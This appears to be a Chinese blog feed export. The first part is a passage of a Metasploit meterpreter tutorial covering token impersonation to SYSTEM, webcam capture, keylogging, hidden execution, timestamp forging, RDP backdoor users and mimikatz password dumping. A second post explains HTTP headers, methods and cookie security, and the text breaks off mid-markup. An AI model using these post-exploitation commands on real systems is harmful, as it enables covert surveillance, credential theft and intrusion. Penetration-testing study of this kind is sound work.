<p>和创建端口转发命令类似，这条命令是删除一条端口转发记录</p><p>命令：<code>portfwd delete -l &lt;portnumber&gt; -p &lt;portnumber&gt; -r &lt;Target IP&gt;</code> n</p><p>如果你想显示所有端口转发记录，你可以使用 portfwd list 命令，</p><p>如果你想删除所有端口转发记录，你可以使用 portfwd flush 命令。</p>        <h2 id="9-11-在目标主机上搜索文件">          <a href="#9-11-在目标主机上搜索文件" class="heading-link"><i class="fas fa-link"></i></a>9.11.在目标主机上搜索文件</h2>      <p>搜索命令可以定位查找目标主机上特定的文件，这个命令可以搜索整个文件系统，也可以用来搜索特定的文件夹。</p><p>例如，如果你想搜索目标主机上的所有 txt 文件，可以使用如下命令；</p><p>命令：search -f *.txt</p>        <h2 id="9-12-获取用户-ID">          <a href="#9-12-获取用户-ID" class="heading-link"><i class="fas fa-link"></i></a>9.12.获取用户 ID</h2>      <p>getuid 命令会显示主机上与运行 meterpreter 服务的用户</p><p>命令：getuid</p>        <h2 id="9-13-获取系统信息">          <a href="#9-13-获取系统信息" class="heading-link"><i class="fas fa-link"></i></a>9.13.获取系统信息</h2>      <p>sysinfo 命令会显示 系统名，操作系统，架构 ，语言等。</p><p>命令：sysinfo</p>        <h2 id="9-14-模拟任何用户（token-操作）">          <a href="#9-14-模拟任何用户（token-操作）" class="heading-link"><i class="fas fa-link"></i></a>9.14.模拟任何用户（token 操作）</h2>      <p>这个进程对于攻击像微软活动目录这样的分布式系统非常有帮助，因为在微饮活动目录中，本地访问权限并没多大用，但是如果能搞到凭证尤其是管理员凭证，那就非常有用了。</p><p>incognito 最开始是一个独立的应用，当你成功入侵系统后可以用它来模拟用户tokens。这个应用后来集成到了metaploit 中,并且最终集成到了meterpreter 中，使用如下:</p><ol><li><p>在 meterpreter 会话中加载这个模块非常简单，只要输入use incognito 命令即可。</p></li><li><p>输入list_tokens -u 来显示所有有效的tokens</p></li><li><p>然后我们需要模拟某个token来获取其权限。还有注意，如果成功模拟了一个token，我们可以使用 getuid 命令来检查当前用户ID。</p></li><li><p>切换到最高权限（SYSTEM），输入：impersonate_token “NT AUTHORITY\SYSTEM”   (注意：SYSTEM权限是比管理员还要高的)</p><p>use incognito -&gt;list_tokens -u -&gt; getuid -&gt; impersonate_token “NT AUTHORITY\SYSTEM”</p></li></ol>        <h2 id="9-15-webcam-摄像头命令">          <a href="#9-15-webcam-摄像头命令" class="heading-link"><i class="fas fa-link"></i></a>9.15 webcam 摄像头命令</h2>      <p>webcam_list  ：查看摄像头</p><p>webcam_snap  ：通过摄像头拍照</p><p>webcam_stream ：通过摄像头开启视频</p>        <h2 id="9-16-execute-执行文件">          <a href="#9-16-execute-执行文件" class="heading-link"><i class="fas fa-link"></i></a>9.16. execute 执行文件</h2>      <p>execute  ：在目标机中执行文件</p><p>execute -H / -i -f cmd.exe    # 创建新的 cmd 进程；-H 不可见；-i 交互(-i 不要加，加了在目标主机就会看到CMD的命令符界面)</p>        <h2 id="9-17-timestomp-伪造时间戳">          <a href="#9-17-timestomp-伪造时间戳" class="heading-link"><i class="fas fa-link"></i></a>9.17. timestomp 伪造时间戳</h2>      <p>timestomp C:// -h       #查看帮助</p><p>timestomp -v C://2.txt     #查看时间戳</p><p>timestomp C://2.txt -f C://1.txt     #将1.txt 的时间戳复制给 2.txt （-f 的参数是复制的意思，后面的复制给前面）（不能找正在运行的文件，将其日期赋值给别的文件，否则会失败的）</p>        <h2 id="9-18-查看盘的所有文件和时间">          <a href="#9-18-查看盘的所有文件和时间" class="heading-link"><i class="fas fa-link"></i></a>9.18. 查看盘的所有文件和时间</h2>      <p><code>dir C:\\</code>(双斜杠)     #查看C盘所有文件及日期</p>        <h2 id="9-19-enable-rdp-脚本开启3389（远程桌面连接）">          <a href="#9-19-enable-rdp-脚本开启3389（远程桌面连接）" class="heading-link"><i class="fas fa-link"></i></a>9.19. enable_rdp 脚本开启3389（远程桌面连接）</h2>      <p>run post/windows/manage/enable_rdp    #开启远程桌面</p><p>run post/windows/manage/enable_rdp USERNAME=haoye PASSWORD=12345   #添加用户密码</p><p>run post/windows/manage/enable_rdp FORWARD=true LPORT=6662    #将3389端口转发到6662</p><p>脚本位于：/usr/share/metasploit-framework/modules/post/windows/manage/enable_rdp.rb</p><p>通过 rdp.rb 脚本可知：开启 rdp 是通过 reg 修改注册表；添加用户是调用 cmd.exe 通过net user 添加；</p><p>端口转发是利用 portfwd 命令。</p>        <h2 id="9-20-键盘记录（这个得靠运气）">          <a href="#9-20-键盘记录（这个得靠运气）" class="heading-link"><i class="fas fa-link"></i></a>9.20. 键盘记录（这个得靠运气）</h2>      <p>keyscan_start       #开启键盘记录</p><p>keyscan_dump     #导出记录数据</p><p>keyscan_stop       #结束键盘记录</p>        <h2 id="9-21-桌面抓图">          <a href="#9-21-桌面抓图" class="heading-link"><i class="fas fa-link"></i></a>9.21. 桌面抓图</h2>      <p>screenshot      </p>        <h2 id="9-22-获取系统管理密码">          <a href="#9-22-获取系统管理密码" class="heading-link"><i class="fas fa-link"></i></a>9.22. 获取系统管理密码</h2>      <p>想直接添加账号进行提权，前面操作是不了，那么我们现在就出杀手锏，直接使用mimikatz来获取系统管理账号的密码。</p><p>第一步：载入mimikatz</p><ol><li>meterpreter &gt; load mimikatz<br>第二步：使用命令wdigest获取密码</li></ol><p>其他详细信息，查看：<span class="exturl"><a class="exturl__link" href="http://xz.aliyun.com/t/2536%EF%BC%88%E5%88%AB%E4%BA%BA%E7%9A%84%E5%8D%9A%E5%AE%A2%EF%BC%89">http://xz.aliyun.com/t/2536（别人的博客）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>]]></content>
      
      
      <categories>
          
          <category> Web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MSF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web应用程序</title>
      <link href="2020/07/02/Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/"/>
      <url>2020/07/02/Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script>        <h1 id="HTTP请求">          <a href="#HTTP请求" class="heading-link"><i class="fas fa-link"></i></a>HTTP请求</h1>      <p>在抓包时，通常有HTTP/1.1或者1.0，1.1或者1.0是因特网上网的HTTP版本，许多浏览器默认使用的都是1.1版本，1.0的比较老了。这两个版本规范之间存在一定的差异，然而，当攻击web应用程序时，web渗透测试工程师可能遇到的唯一差异是1.1的版本必须使用Host请求头。</p><p>Host：就是域名，访问网站的IP地址。</p><a id="more"></a><p>Accept-Encoding：浏览器支持的压缩编码是gzip和deflate。（当前的请求的http页面是经过压缩的，用于增加用户体验，访问更快了，但是会给服务器带来一定的压力，因为它要做压缩距离）</p><p>Accept-Language：浏览器支持的语言类型是中文和简体中文，优先支持简体中文。zh-cn表示简体中文，zh表示中文；q是权重系数，在0-1之间，q值越大，请求越倾向于获得其“：”之前的类型表示的内容，若没有指定的q值，默认为1，若被赋值0，则用于提醒服务器哪些是浏览器不支持的内容类型。</p><p>Cookie：消息头用于提交服务器向客户端发布的其他参数</p><p>Connection：clsoe/keep-live, 与网站的连接状态；close的服务器配置比较好，在访问人数过多的时候，如果一直是keep的状态，会消耗很多的服务器资源，因为TCP的连接数是有限的。</p><p>Cache-Control：这个消息头用于向服务器发送缓存的指令（如：no-cache，没有缓存)</p><p>Upgrade-insecure-Requests：该指令用于让浏览器自动升级请求从http升到https，用于大量包含http资源的http网页直接升级到https不会报错，间洁地来说，就是在http和https之间起着过渡作用。（只用https才有这个字段，强行切换成https，有加密的，解决安全问题）</p><p>User-Agent：代表自己的浏览器版本和自己本机的操作系统版本。注意：由于历史原因，大多数浏览器中都包含Mozilla这个前缀，这是因为最初占支配地位的Netscape浏览器使用了User-Agent字符串，而其他浏览器也希望让web站点相信它们与这种标准兼容。</p><p>Accept：浏览器支持的MIME类型分别是text/html，application/xhtml+xml，application/xml，x/x,，优先顺序按从左到右的顺序（表示当前浏览器希望接受什么类型的文件，这是请求首部，当服务器没有客户端想要的资源的媒体资源类型时，会返回 406 Not Acceptable 响应，当然，使用了x/x代表接受任意类型的资源，所以不会看到这个响应。另外，这里的q代表权重，在0-1之间，可以理解成客户端在这些给定的类型中，想优先接受什么类型，服务器可以根据客户端要求返回响应的资源。（如果没有，则默认为1。这里前面几个类型都没有标注，则默认为1，表示优先这些类型。后面0.9表示前面都没有就用这个，最后 的0.8表示，都没有的话任意类型都可以）</p><p> <strong>详解：</strong></p><p>​        text/html，application/xhtml+xml，application/xml可以理解为媒体类型和内容类型，/前面时 type（类型），/ 后面是        subtype（子类型）：type指定大的范围，subtype是type中范围更加明确的类型，即大类中的小类。</p><p>​        Text：用于标准化地表示文本信息，文本消息可以是多种字符集和或者多种格式的</p><p>​        text/html：表示html文档</p><p>​        Application：用于传输应用程序数据或者二进制数据。</p><p>​        application/xhtml+xml：表示xhtml文档</p><p>​        application/xml：表示xml文档</p><p>Referer：当前页面是由什么网页跳转而来的，可以用于防盗链，意思就是加了这个，当当前页面不是从它应该从的跳转页面而来的视为非法。</p><p>ETag：这个消息头用于指定一个实体标签，客户端可在将来的请求中提交这个标识符，获得和If-None-Match消息头中相同的资源，通知服务器浏览器当前缓存中保存的是哪个版本的资源。</p><p>Enprires：这个消息头用于向浏览器说明消息主体内容的有效时间，在这个有效时间之前，浏览器可以使用这个资源的缓存副本。</p><p>Location：这个消息头用于在重定向响应（那些状态码为3开头的响应）中说明重定向的目标。</p><p>Pragma：消息头指示浏览器不要将响应保存在缓存中。Expires 消息头指出响应内容已经过期因此不应保存在缓存中。当返回动态内容时常常会发送这些指令，以确保浏览器随时获得最新内容。</p><p>X_FORWARDED_FOR：用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求字段。（可以进行伪造绕过当前的网页，进入下一个网页，例如：X_FORWARDED_FOR：10.0.0.1，就可以直接访问10.0.0.1）</p><p>Authorization：这个消息头用于为一种内置HTTP身份验证向服务器提交证书。</p><p>If-Modified-Since：这个消息头用于说明浏览器最后一次收到所请求的资源的时间。如果自那以后资源没有发生变化，服务器就会发出一个带状态码304的响应，指示客户端使用资源的缓存副本。</p><p>If-None -Match：这个消息头用于指定- 一个实体标签。实体标签是-一个说明消息主体内容的标识符。当最后一次收到所请求的资源时.浏览器提交服务器发布的实体标签。服务器可以使用实体标签确定浏览器是否使用资源的缓存副本。</p><p>0rigin：这个消息头用在跨域Ajax t求中，用于指示提出请求的域。</p>        <h1 id="HTTP响应">          <a href="#HTTP响应" class="heading-link"><i class="fas fa-link"></i></a>HTTP响应</h1>      <p>HTTP/1.1 200 OK：证明当前网页正常访问</p><p>Server：消息头中包含一个旗标，指明所使用的Web服务器软件，有时还包括其他信息，如：所安装的模块和服务器操作系统，但其中所包含的信息可能不准确。（服务器类型，什么nginx之类的）</p><p>Set-Cookie：消息头向浏览器发送另一个cookie，它将随后向服务器发送的请求中由Cookie消息头返回。</p><p>Pragma ：消息头指示浏览器不要将响应保存在缓存中。Expires 消息头指出响应内容已经过期因此不应保存在缓存中。当返回动态内容时常常会发送这些指令，以确保浏览器随时获得最新内容。</p><p>几乎所有的HTTP响应在消息头后的空白行下面都包含消息主体，Content-Type 消息头示这个消息主体中包含一个HtML文档。</p><p>Content-Length：消息头规定消息主体的字节长度。</p><p>ETag：w/”59a3dc83-f61”浏览器根据HTTP请求的ETag验证请求的资源是否发生了改变，如果它未发生变化，服务器将返回“304 Not Modified” 响应，并且资源从浏览器缓存中读取，这样就不必再次下载请求。（也是与缓存有关的，就是我缓存过这个文件，下次我再访问时服务器就不会再次下载这个文件了，这个缓存是已经下载到我们的本地了）</p><p>Vary：Accept-Encoding”标头：说明对方网站一般启用了GZip压缩</p><p>Expires：RFC 2616 (HTTP/1. 0)协议中和网页缓存相关字段。用来控制缓存的失效日期。</p><p>Content-Length：代表请求的数据包，就是html文件的长度大小，渗透测试或者是暴力破解就是根据这个来判断，正确的密码和错误的密码是不一样的。</p><p>X-Powered-By：网站使用的框架（如：thinkphp)</p><p>X-Frame-Options：这个消息头指示浏览器框架是否及如何加载当前响应。</p><p>Last-Modified：说明对于访问的文件，服务器的运维人员最后一次修改的日期。</p><p>Location：这个消息头用于在重定向响应（那些状态码为3开头的响应）中说明重定向的目标。</p><p>Access-Control-Allow-Origin：这个消息头用于指示可否通过跨域Ajax请求获取资源。</p><p>WWW-Authenticate：这个消息头用在带401状态码的响应中，提供与服务器所支持的身份验证类型有关的信息。（系统支持的身份认证，windows和Linux支持的）</p>        <h1 id="HTTP方法">          <a href="#HTTP方法" class="heading-link"><i class="fas fa-link"></i></a>HTTP方法</h1>      <p>HTTP1.0 定义了三种请求方法： GET, POST 和 HEAD方法。</p><p>HTTP1.1 新增了六种请求方法：OPTIONS、PUT、PATCH、DELETE、TRACE 和 CONNECT 方法。</p><p>当渗透测试员攻击Web应用程序时,几乎肯定会遇到最常用的方法:GET和POST.这些方法之间存在-些必须了解的重要差异，忽略这些差异可能会危及应用程序的安全。</p>        <h2 id="1-GET">          <a href="#1-GET" class="heading-link"><i class="fas fa-link"></i></a>1.GET</h2>      <p>GET方法的作用在于获取资源。它可以用于URL查询字符串的形式向所请求的资谏发送参数。这使用户可将一个包含动态资源的UrL标注为书签，用户自己或其他用户随后可重复利用该书签来获取等价的资源(作用与标注为书签的搜索查询相似)。URL显示在屏幕上.并被记录在许多地方，如浏览器的历史记录和Web服务器的访问旧志中。如果单击外部链接，还可以用Referer消息头将它们传送到其他站点。因此，请勿使用查询字符申传送任何敏感信息。</p>        <h2 id="2-POST">          <a href="#2-POST" class="heading-link"><i class="fas fa-link"></i></a>2.POST</h2>      <p>POST方法期初是用来向服务器输入数据的，实际上，通常会用它来支持HTML的表单。表单中填好的数据通常会被送给服务器，然后由服务器将其发送到它要去的地方。</p>        <h2 id="3-HEAD">          <a href="#3-HEAD" class="heading-link"><i class="fas fa-link"></i></a>3.HEAD</h2>      <p>HEAD方法和GET方法的行为很类似，但是服务器在响应中只返回首部，不会返回实体的主体部分。这就允许客户端在未获取实际资源的情况下，对资源的首部进行检查。（优点：在不获取资源的情况下了解资源的情况（比如：判断其类型）；通过查看响应的状态码，看看某个对象是否存在；通过查看首部，测试资源是否被修改了）。</p>        <h2 id="4-PUT">          <a href="#4-PUT" class="heading-link"><i class="fas fa-link"></i></a>4.PUT</h2>      <p>PUT与GET从服务器读取文档想法，PUT方法会向服务器写入文档。PUT方法的语义就是让服务器用请求的主体部分来创建一个由所请求的URL命名的新闻的，或者替换已存在的URL。</p>        <h2 id="5-TRACE">          <a href="#5-TRACE" class="heading-link"><i class="fas fa-link"></i></a>5.TRACE</h2>      <p>客户端发起一个请求时，这个请求可能要穿过防火墙、代理、网关或者其他一些应用程序。每个中间节点都可能会修改原始的HTTP请求。TRACE方法允许客户端在最终将请求发送给服务器时，看看它变成什么样子了。        TRACE请求会在目的服务器端发起一个“环回”诊断。行程最后一站的服务器会弹回一条TRACE响应，并在响应主体中携带它收到的原始请求报文。这样客户端就可以查看在所有中间HTTP应用程序组成的请求/响应链上，原始报文是否被毁坏，以及如何被毁坏或修改过。</p><p>TRACE方法主要用于诊断，用于验证请求是否如愿穿过了请求/响应链。可以用来查看代理和其他应用程序对用户请求所产生的效果。        TRACE的缺点是：它假定中间应用程序对各种不同类型请求的处理是相同的。很多HTTP应用程序会根据方法的不同做出不同的事情，例如代理会把POST请求直接发给服务器，而GET请求发送给另一个HTTP应用改程序（比如缓存）。TRACE不提供区分这些方法的机制，通常中间应用程序会自行决定对TRACE请求的处理方式。        TRACE请求中不能带有实体的主体部分。TRACE响应的实体主体部分包含了响应服务器收到的请求的精确副本。</p>        <h2 id="6-OPTIONS">          <a href="#6-OPTIONS" class="heading-link"><i class="fas fa-link"></i></a>6.OPTIONS</h2>      <p>OPTIONS方法请求Web服务器告知其支持的各种功能。可以询问服务器通常支持哪些方法，或者对某些特殊资源支撑哪些方法。（有些服务器可能只支持对一些特殊类型的对象使用特定的操作）        这为客户端应用程序提供了一种手段，使其不用实际访问那些资源就能判定访问各种资源的最优方式</p>        <h2 id="7-DELETE">          <a href="#7-DELETE" class="heading-link"><i class="fas fa-link"></i></a>7.DELETE</h2>      <p> DELETE方法所做的事情就是请服务器删除请求URL所指定的资源。但客户端应用程序无法保证删除操作一定会被执行。因为HTTP规范允许服务器在不通知客户端的情况下撤销请求。</p>        <h2 id="8-CONNECT">          <a href="#8-CONNECT" class="heading-link"><i class="fas fa-link"></i></a>8.CONNECT</h2>      <p>HTTP/1.1 协议中预留给能够将连接改为管道方式的代理服务器。</p>        <h2 id="9-PATCH">          <a href="#9-PATCH" class="heading-link"><i class="fas fa-link"></i></a>9.PATCH</h2>      <p>是对 PUT 方法的补充，用来对已知资源进行局部更新 。</p>        <h2 id="10-GET和POST的区别">          <a href="#10-GET和POST的区别" class="heading-link"><i class="fas fa-link"></i></a>10.GET和POST的区别</h2>      <p>1、GET请求的数据是放在HTTP包头中的，也就是URL之后，通常是像下面这样定义格式的：login.action?name=hyddd&amp;password=idontknow&amp;verify=%E4%BD%E5%A5%BD其中，以?来分隔URL和数据；以&amp;来分隔参数；如果数据是英文或数字，原样发送；如果数据是中文或其它字符，则进行BASE64编码。而Post是把提交的数据放在HTTP正文中的。       </p><p> 2、GET提交的数据比较少，最多1024B，因为GET数据是附在URL之后的，而URL则会受到不同环境的限制的，比如说IE对其限制为2K+35，而POST可以传送更多的数据（理论上是没有限制的，但一般也会受不同的环境，如浏览器、操作系统、服务器处理能力等限制，IIS4可支持80KB，IIS5可支持100KB）。        </p><p>3、Post的安全性要比Get高，因为Get时，参数数据是明文传输的，参数直接暴露在url中，所以不能用来传递敏感信息。而且使用GET的话，还可能造成Cross-site request forgery攻击。而POST数据则可以加密的，但GET的速度可能会快些。        4、get请求只能进行url编码，而post支持多种编码方式；get请求会浏览器主动cache，而post支持多种编码方式；get请求参数会被完整保留在浏览历史记录里，而post中的参数不会被保留。        </p><p>5、GET和POST本质上就是TCP链接，并无差别。但是由于HTTP的规定和浏览器/服务器的限制，导致他们在应用过程中体现出一些不同。        </p><p>6、GET产生一个TCP数据包；POST产生两个TCP数据包。对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）；而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。</p>        <h2 id="11-扩展方法">          <a href="#11-扩展方法" class="heading-link"><i class="fas fa-link"></i></a>11.扩展方法</h2>      <p>http被设计成可扩展的，这样新特性就不会使老的版本失效。扩展方法指的是没在HTTP/1.1中规范定义的，服务器为它管理的资源实现一些HTTP服务，为开发者提供了一种扩展这些HTTP服务能力的手段        </p><p>下表列出了一些常用的扩展方法：        </p><p>LOCK:允许用户“锁定资源”编辑某个资源时将其锁定，以防别人同时对其修改        </p><p>MKCOL:允许用户创建资源        </p><p>COPY:便于在服务器上复制资源        </p><p>MOVE:在服务器上移动资源        </p><p>上面例子中的方法便于用过http将web内容发布到web服务器上。        </p><p>不是所有的扩展都是在正式规范中定义的，因此，扩展方法秉持“对发送内容要求严格，对所接受的内容宽容点”来处理一般的HTTP扩展方法很重要。</p>        <h1 id="Cookie">          <a href="#Cookie" class="heading-link"><i class="fas fa-link"></i></a>Cookie</h1>              <h2 id="1-cookie是什么">          <a href="#1-cookie是什么" class="heading-link"><i class="fas fa-link"></i></a>1.cookie是什么</h2>      <p>由于http是无状态的协议，一旦客户端和服务器的数据交换完毕，就会断开连接，再次请求，会重新连接，这就说明服务器单从网络连接上是没有办法知道用户身份的。怎么办呢?那就给每次新的用户请求时，给它颁发一个身份证(独一无二)吧，下次访问，必须带上身份证，这样服务器就会知道是谁来访问了，针对不同用户，做出不同的响应。，这就是Cookie的原理。</p><p>其实cookie是一个很小的文本文件,是浏览器储存在用户的机器上的。Cookie是纯文本，没有可执行代码。储存一些服务器需要的信息，每次请求站点，会发送相应的cookie,这些cookie可以用来辨别用户身份信息等作用。</p><p><strong>例如</strong>：</p><p>HTTP/1 0200 OK</p><p>Set-Cookie：id= 23451 * domain “ zhuanzhuan 58 com *Conent-type text/html</p><p>Content-length: 1287</p><p>用户首次访问服务器，服务器会返回一个独-无二的识别码，id=23451，这样服务器可以用这个码跟踪记录用户的信息，(购物历史， 地址信息等) 。</p><p>cookie可以包含任意的信息，不仅仅是id,客户端会记录服务器返回来的Set Cookie首部中的cookie内容。并将cookie 存储在浏览器的cookie数据库中，当用户访问同一站点时，浏览器就会挑选当时该站点颁发的id=XxX的身份证(cookie) ，并在Cookie请求首部发送过去。   </p>        <h2 id="2-cookie利用">          <a href="#2-cookie利用" class="heading-link"><i class="fas fa-link"></i></a>2.cookie利用</h2>      <p>cookie是大多数Web应用程序所依赖的HTTP协议的一一个关键组成部分，攻击者常常通过它来。利用Web应用程序中的漏洞。服务器使用cookie 机制向客户端发送数据，客户端保存cookie 并将其返回给服务器。与其他类型的请求参数(存在于URL 查询字符串或消息主体中)不同，无须应用程序或用户采取任何特殊措施.随后的每一个请求 都会继续重新向服务器提交cookie。</p><p>如前所述，服务器使用Set-Cookie响应消息头发布cookie；</p><p>Set-Cookie: tracking=tI8rk7 jllx44S2u85nSWcw（一般的也是持久cookie，设定一定的到期日期，不会随着浏览器的关闭导致cookie的被删除）</p><p>然后，用户的浏览器自动将下面的消息头进行添加，随后返回给同一服务器的请求中；</p><p>Cookie: tracking=tl8rk7jolx44S2Uu85nSWcu</p><p>如上所示. cookie -般由一个名/值对构成，但也可包含任何不含空格的字符串。可以在服务，器响应中使用几个Set-Cookie消息头发布多个cookie.并可在同一个Cookie消息头中用分号分隔不同的cookie,将它们全部近回给服务器。</p><p>除cookie的实际位外，Set-Cookie 消息头还可包含以下任何可选属性，用它们控制浏览器处理cookie的方式。</p><p>expires：用于设定cookie的有效时间。这样会使浏览器将cookie保存在永久性的存储器中，在随后的浏览器会话中重复利用，直到到期时间为止。如果没有设定这个属性，那么cookie 仅用在当前浏览器会话中。（cookie过期的日期）</p><p>domain：用于指定cookie的有效域。这个域必须和收到cookie的域相同，或者是它的父域。</p><p>path：用于指定cookie的有效URL路径。</p><p>secure：如果设置这个属性，则仅在HTTPS请求中提交cookie。</p><p>HttpOnly.：如果设置这个属性， 将无法通过客户端JavaScript直接访问cookie. 。</p><p>上述每一个cookie属性都可能影响应用程序的安全其造成的主要不利影响在于攻击者能够，直接对应用程序的其他用户发动攻击。</p>        <h2 id="3-cookie的类型">          <a href="#3-cookie的类型" class="heading-link"><i class="fas fa-link"></i></a>3.cookie的类型</h2>      <p>可以按照过期时间分为两类：会话cookie和持久cookie.</p><p>会话cookie是一-种临时 cookie,用户退出浏览器，会话Cooke就会被删除了；持久cookie则会储存在硬盘里，保留时间更长，关闭浏览器，重启电脑，它依然存在，通常是持久性的cookie会维护某一个用户周期性 访问服务器的配置文件或者置录信息。</p>        <h2 id="4-cookie的属性">          <a href="#4-cookie的属性" class="heading-link"><i class="fas fa-link"></i></a>4.cookie的属性</h2>              <h3 id="cookie域">          <a href="#cookie域" class="heading-link"><i class="fas fa-link"></i></a>cookie域</h3>      <p>产生Cookie的服务器可以向set- Cookie响应首部添加一个Domain属性来控制哪些站点可以看到那个cookie</p><p>例如：Set-Cookie：name=”wang”; domain=”m. zhuanzhuan. 58. com”</p><p>如果用户访问的是m.zhuanzhuan.58.com，那就会发送cookie：name=”wang”；如果是访问<span class="exturl"><a class="exturl__link" href="http://www.aaa.com(而不是这个m.zhuanzhuan.58.com),就不会发送这个cookie./">www.aaa.com（而不是这个m.zhuanzhuan.58.com)，就不会发送这个cookie。</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>        <h3 id="cookie的路径path">          <a href="#cookie的路径path" class="heading-link"><i class="fas fa-link"></i></a>cookie的路径path</h3>      <p>Path属性可以为服务器特定文档指定Cooke,这个属性设置的url且带有这个前缀的url路径都是有效的。</p><p>例如：m.zhuanzhuan.58.com和m.zhuanzhuan.58.com/user/这连个url，</p><ol><li><p>m.zhuanzhuan.58.com设置cookie：</p><p>Set-cookie：id=”123432” ; domain=”m. zhuanzhuan. 58. com”</p></li><li><p>m.zhuanzhuan.58.com/user/设置cookie</p><p>Set-cookie：user=”wang” , domain=”m. zhuanzhuan. 58. com”;path=/user/</p></li><li><p>other</p><p>但是访问其他路径：m.zhuanzhuan.58.com/other/就会获得：cookie：id=”123432”</p><p>如果访问m.zhuanzhuan.58.com/user/就会获得：cookie：id=”123432”;cookie：user=”wang”</p></li></ol>        <h3 id="secure">          <a href="#secure" class="heading-link"><i class="fas fa-link"></i></a>secure</h3>      <p>设置了属性secure, cookie只有在https协议加密情况下才会发送给服务端，但是这并不是最安全的，由于其固有的不安全性，教感信息也是不应该通过cookie传输的.</p><p>Set-Cookie：id-a3fWa；Expires=Wed，21 Oct  2015  07:28:00 GMT，Secure；chrome 52和firefox 52开始不安全的(HTTP)是无法快用secure的。</p>        <h1 id="操作Cookie">          <a href="#操作Cookie" class="heading-link"><i class="fas fa-link"></i></a>操作Cookie</h1>      <p>通过docuemnt.cookie可以设置和获取Cookie的值</p><p>document.cookie =”user=wang” ;</p><p>console. log (document. cookie);<br>禁止javascnipt操作cookie (为避免跨域脚本(xss)攻击，通过javascipt的document.cookie无法访问常有Httponly标记的cookie)<br>Set-Cookie：id-a3fWa; Expires=Wed, 21 0ct 2017 07:28:00 GMT; Secure；HttpOnly</p>        <h1 id="第三方cookie">          <a href="#第三方cookie" class="heading-link"><i class="fas fa-link"></i></a>第三方cookie</h1>      <p>通常cookie的域和浏览器地址的域匹配，这被称为第一方 cookie.那么第三方cookie就是cookie的域和地址栏中的域不匹配，这种cookie通常被用在第三方广告网站。为了跟踪用户的浏览记录，并且根据收集的用户的浏览习惯，给用户推送相关的广告。</p><p>例如：</p><ol><li><p>用户访问服务器1的一个页面index.html,这个页面和第三方广告网站合作，这个页面还有一张<span class="exturl"><a class="exturl__link" href="http://www.advertisement.com域名下的一张广告图ad1.jpg,当请求这张ad1.jpg图片的时候,www.advertisement.com这个服务器会给用户设置cookie/">www.advertisement.com域名下的一张广告图ad1.jpg,当请求这张ad1.jpg图片的时候，www.advertisement.com这个服务器会给用户设置cookie</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>:</p><p>Set-Cookie: user= “wang”；like=”a”；domin=”advertisement.com”</p><p>记录用户的浏览记录，分配个user来表示用户的身份。</p></li><li><p>用户访问服务器2的一个index.html页面，这个页面也和同家广告商合作，这个页面也包含一张<span class="exturl"><a class="exturl__link" href="http://www.advertisement.com域名下的张广告图ad2.jpg,当请求这张ad2.jpg图片的时候,浏览器就会向www.advertisement.com发送cookie/">www.advertisement.com域名下的张广告图ad2.jpg,当请求这张ad2.jpg图片的时候，浏览器就会向www.advertisement.com发送cookie</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span><br>Cookie：user=” wang”; like=”a”;</p><p> <span class="exturl"><a class="exturl__link" href="http://www.advertisement.com收到浏览器发送的cookie识别了用户的身份,同时又把这个页面用户的浏览数据设置cookie/">www.advertisement.com收到浏览器发送的cookie识别了用户的身份，同时又把这个页面用户的浏览数据设置cookie</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>Set -Cookie: buy= “b” ; domain= ”adverti sement.com”</p></li><li><p>很巧，用户访问服务器3的一个index.html页面，这个页面也和那家广告商合作，这个页面也包含一张<span class="exturl"><a class="exturl__link" href="http://www.advertisement.com域名下的张广告图ad3.jpg,当请求这张ad3.jpg图片的时候,浏览器就会向www.advertisement.com发送cookie/">www.advertisement.com域名下的张广告图ad3.jpg,当请求这张ad3.jpg图片的时候，浏览器就会向www.advertisement.com发送cookie</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>Cookie: user=”wang”; like=”a”; buy=”b”</p><p>这样广告公司就可以根据用户的浏览习惯，给用户推送合适的广告。</p></li></ol>        <h1 id="安全">          <a href="#安全" class="heading-link"><i class="fas fa-link"></i></a>安全</h1>      <p>多数网站使用cookie作为用户会话的唯一标识， 因为其他的方法具有限制和漏洞。如果一 个网站使用cookies作为会<br>话标识符，攻击者可以通过窃取一套用户的cookies来冒充用户的请求。从服务器的角度，它是没法分辨用户和攻击者<br>的，因为用户和攻击者拥有相同的身份验证，下面介绍几种cookie盗用和会话劫持的例子：</p>        <h3 id="1-网络窃听">          <a href="#1-网络窃听" class="heading-link"><i class="fas fa-link"></i></a>1.网络窃听</h3>      <p>网络上的流量可以被网络上任何计算机拦截，特别是未加密的开放式WIFI.这种流量包含在普通的未加密的HTTP请求上发送Cookie.在未加密的情况下，攻击者可以读取网络上的其他用户的信息，包含HTTP Cookie的全部内容，以便进行中间的攻击。比如：拦截cookie来冒充用户身份执行恶意任务(银行转账等)。<br>解决办法：服务器可以设置secure属性的cookie,这样就只能通过https的方式来发送cookies 了。</p>        <h3 id="2-DNS缓存中毒">          <a href="#2-DNS缓存中毒" class="heading-link"><i class="fas fa-link"></i></a>2.DNS缓存中毒</h3>      <p>如果攻击者可以使DNS缓存中毒，那么攻击者就可以访问用户的Cookie了，例如:攻击者使用DNS中毒来创建个<br>虚拟的NDS服务h123456.<span class="exturl"><a class="exturl__link" 